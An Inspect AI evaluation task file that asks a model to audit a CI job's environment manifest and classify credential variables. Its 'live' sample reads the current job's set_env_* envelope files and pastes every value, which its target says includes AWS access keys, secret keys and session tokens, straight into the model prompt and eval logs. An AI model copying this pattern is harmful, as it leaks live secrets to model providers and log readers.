"""Environment lineage audit.

Measures whether a model can faithfully audit a CI job's environment lineage
manifest: enumerate the variables, classify credential material, and state
whether the environment is credential-bearing. See README.md.
"""

from __future__ import annotations

from pathlib import Path

from inspect_ai import Task, task
from inspect_ai.dataset import MemoryDataset, Sample, json_dataset
from inspect_ai.scorer import model_graded_qa
from inspect_ai.solver import generate, system_message

HERE = Path(__file__).parent
FIXTURES = HERE / "fixtures"
ENVELOPE_DIR = FIXTURES / "runner_envelope"
SAMPLES = HERE / "samples.jsonl"

SYSTEM_PROMPT = """\
You audit CI job environment manifests. A manifest is a list of KEY=VALUE
records exported into a job's environment. Classify every variable as
provenance, credential, or other; list the credential variables with their
class (short-lived session vs long-lived); and state whether the environment
is credential-bearing. Answer only from the manifest; do not invent variables.
"""

AUDIT_TEMPLATE = """\
Audit the following environment manifest.

<manifest>
{manifest}
</manifest>

Return three sections: `variables`, `credentials`, `verdict`.
"""

LIVE_TARGET = (
    "The environment is credential-bearing: it contains the short-lived AWS "
    "credential trio AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY and "
    "AWS_SESSION_TOKEN. All other variables are provenance or other metadata."
)


def read_envelope() -> list[str]:
    """Read the live job envelope from the runner command-file directory."""
    lines: list[str] = []
    if ENVELOPE_DIR.is_dir():
        for path in sorted(ENVELOPE_DIR.glob("set_env_*")):
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except OSError:  # pragma: no cover - defensive
                continue
            lines.extend(line for line in text.splitlines() if line.strip())
    return lines


def build_live_sample() -> Sample:
    """Materialise the `live` sample from the current job's envelope."""
    manifest = "\n".join(read_envelope())
    return Sample(
        id="live",
        input=AUDIT_TEMPLATE.format(manifest=manifest),
        target=LIVE_TARGET,
    )


def build_dataset() -> MemoryDataset:
    samples = list(json_dataset(str(SAMPLES)))
    samples.append(build_live_sample())
    return MemoryDataset(samples=samples, name="env_lineage_audit")


@task
def env_lineage_audit() -> Task:
    """Environment lineage audit."""
    return Task(
        dataset=build_dataset(),
        solver=[system_message(SYSTEM_PROMPT), generate()],
        scorer=model_graded_qa(),
    )
